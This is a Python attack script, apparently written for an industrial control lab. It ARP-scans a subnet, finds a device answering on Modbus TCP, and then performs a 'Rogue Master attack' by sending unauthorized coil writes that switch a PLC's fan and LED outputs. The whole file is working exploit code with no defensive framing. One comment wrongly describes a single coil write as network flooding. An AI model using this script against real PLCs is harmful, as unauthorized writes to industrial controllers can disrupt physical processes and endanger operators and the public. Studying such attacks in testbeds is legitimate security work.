import socket
from scapy.all import ARP, Ether, srp
from pymodbus.client.sync import ModbusTcpClient

# Step 1: Network Scan to Locate the PLC's IP Address
def scan_network(ip_range):
    """
    Scans the local network to detect devices (including the PLC).
    :param ip_range: The IP range to scan (e.g., "192.168.9.0/24").
    :return: A list of detected IP addresses.
    """
    print(f"Scanning the network range: {ip_range}")
    devices = []
    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for element in answered_list:
        devices.append(element[1].psrc)
    
    return devices

def identify_plc(devices):
    """
    Uses a basic Modbus handshake to identify the target Schneider Electric PLC.
    :param devices: List of detected IP addresses.
    :return: The IP address of the target PLC.
    """
    for ip in devices:
        print(f"Attempting to connect to {ip}")
        try:
            # Attempt to connect to the device via Modbus TCP
            client = ModbusTcpClient(ip)
            if client.connect():
                print(f"Successfully connected to {ip}")
                # A successful Modbus TCP connection indicates it is a valid PLC
                client.close()
                return ip
        except Exception as e:
            print(f"Failed to connect to {ip}: {e}")
    
    print("No Schneider Electric PLC found in the scanned devices.")
    return None

# Step 2: Rogue Master Setup (Impersonating the Master and Sending Commands)
def rogue_master_attack(plc_ip):
    """
    Performs a Rogue Master attack on the identified PLC.
    :param plc_ip: The IP address of the target PLC.
    """
    print(f"Starting Rogue Master attack on the PLC at {plc_ip}")
    client = ModbusTcpClient(plc_ip)

    try:
        if client.connect():
            # Unauthorized write to control the fan (%Q0.0)
            address = 0  # Modbus address for %Q0.0 (Fan control)
            value = 1    # Turn the fan ON
            print(f"Sending unauthorized command to turn ON the fan (Address: {address}, Value: {value})")
            client.write_coil(address, value)

            # Unauthorized write to turn on the green LED (%Q0.5)
            address = 5  # Modbus address for %Q0.5 (Green LED control)
            value = 1    # Turn the Green LED ON
            print(f"Sending unauthorized command to turn ON the Green LED (Address: {address}, Value: {value})")
            client.write_coil(address, value)

            # Disrupt network communications by flooding
            print("Disabling the Red LED (Address: 4) as part of disruption.")
            client.write_coil(4, 0)  # Turn OFF Red LED

            print("Rogue Master attack completed successfully.")
        else:
            print("Failed to connect to the PLC for the attack.")
    except Exception as e:
        print(f"An error occurred during the attack: {e}")
    finally:
        client.close()

# Main Execution Logic
if __name__ == "__main__":
    # Define the IP range to scan for the PLC (modify as necessary)
    ip_range = "192.168.9.0/24"
    
    # Step 1: Scan the network to find the PLC
    detected_devices = scan_network(ip_range)
    target_plc_ip = identify_plc(detected_devices)

    if target_plc_ip:
        # Step 2: Perform Rogue Master attack
        rogue_master_attack(target_plc_ip)
    else:
        print("No target PLC found for the attack.")